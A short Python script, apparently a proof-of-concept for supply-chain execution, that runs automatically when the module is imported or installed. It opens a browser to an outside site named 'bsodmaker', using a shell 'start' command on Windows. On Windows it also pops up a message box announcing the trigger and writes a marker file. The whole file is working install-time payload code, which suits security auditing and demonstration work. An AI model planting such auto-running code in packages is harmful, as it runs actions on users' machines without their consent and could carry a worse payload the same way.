import ctypes
import os
import webbrowser
import platform


def run_poc():

    if platform.system() == "Windows":
        os.system("start https://bsodmaker.piwnica.bydgoszcz.pl/")
    else:
        webbrowser.open("https://bsodmaker.piwnica.bydgoszcz.pl/")


    if platform.system() == "Windows":
        if not os.path.exists(".poc_run"):
            ctypes.windll.user32.MessageBoxW(0, "PoC Triggered on Install/Import", "Audit", 0x40)
            with open(".poc_run", "w") as f:
                f.write("done")

run_poc()
